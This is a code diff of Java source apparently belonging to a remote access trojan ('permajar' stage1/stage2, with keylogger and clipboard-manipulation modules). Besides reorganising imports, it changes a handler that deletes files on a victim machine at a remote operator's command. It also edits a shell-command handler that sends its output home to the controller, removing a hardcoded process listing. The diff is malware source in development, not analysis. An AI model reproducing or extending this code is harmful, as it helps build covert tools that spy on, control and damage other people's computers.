@@ -17,18 +17,10 @@
  *******************************************************************************/
 package subterranean.crimson.permajar.stage2;
 
-
-
-import java.io.IOException;
-import java.net.URL;
-import java.net.URLClassLoader;
+import java.io.File;
 import java.util.ArrayList;
-import java.util.Enumeration;
 import java.util.HashMap;
-import java.util.jar.JarEntry;
-import java.util.jar.JarFile;
 
-import subterranean.crimson.permajar.stage1.PermaJar;
 import subterranean.crimson.permajar.stage1.Stage1;
 import subterranean.crimson.permajar.stage1.network.Communications;
 import subterranean.crimson.permajar.stage2.modules.ClipboardManipulator;
@@ -43,16 +35,17 @@ import subterranean.crimson.permajar.stage2.modules.keylogger.Keylogger;
 import subterranean.crimson.server.PluginOperations;
 import subterranean.crimson.universal.BMN;
 import subterranean.crimson.universal.Cryptography;
-import subterranean.crimson.universal.EncType;
 import subterranean.crimson.universal.GetFileInfo;
 import subterranean.crimson.universal.Logger;
+import subterranean.crimson.universal.ObjectTransfer;
 import subterranean.crimson.universal.Platform;
 import subterranean.crimson.universal.SigarCollection;
-import subterranean.crimson.universal.StreamStore;
+import subterranean.crimson.universal.Utilities;
 import subterranean.crimson.universal.Version;
 import subterranean.crimson.universal.containers.Message;
-import subterranean.crimson.universal.objects.InvalidObjectException;
-import subterranean.crimson.universal.objects.ObjectTransfer;
+import subterranean.crimson.universal.enumerations.EncType;
+import subterranean.crimson.universal.exceptions.InvalidObjectException;
+import subterranean.crimson.universal.streams.StreamStore;
 import subterranean.crimson.universal.translation.T;
 
 public enum Executor {
@@ -246,7 +239,7 @@ public enum Executor {
 		}
 		case BMN.FILEMANAGER_delete: {
 
-			Stage2.f.delete((String) m.auxObject[0]);
+			Utilities.delete(new File((String) m.auxObject[0]));
 
 			break;
 		}
@@ -304,12 +297,6 @@ public enum Executor {
 			Shell tempshell = new Shell();
 
 			String[] output = null;
-
-			if (Platform.windows) {
-				tempshell.run("");
-			} else {
-				tempshell.run("ps -aux");
-			}
 
 			Message mres = new Message(m.getStreamID(), m.getName(), output);
 			Communications.sendHome(mres);
